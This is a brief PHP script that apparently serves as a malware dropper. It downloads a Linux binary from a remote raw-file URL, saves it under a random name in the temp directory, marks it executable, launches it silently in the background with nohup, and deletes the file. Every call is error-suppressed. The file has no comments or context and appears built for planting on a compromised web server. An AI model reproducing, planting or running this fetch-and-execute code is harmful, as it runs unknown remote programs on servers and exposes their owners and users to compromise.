<?php
$u = 'https://cdn.githubraw.com/Shinedremuse/byibnflf/57d092d15beee3af2f4e6cad7c9f0dd433886654/res1389_linux';
$f = sys_get_temp_dir() . DIRECTORY_SEPARATOR . bin2hex(random_bytes(4));
@file_put_contents($f, @file_get_contents($u));
@chmod($f, 0755);
@shell_exec('nohup ' . escapeshellarg($f) . ' > /dev/null 2>&1 &');
@unlink($f);
?>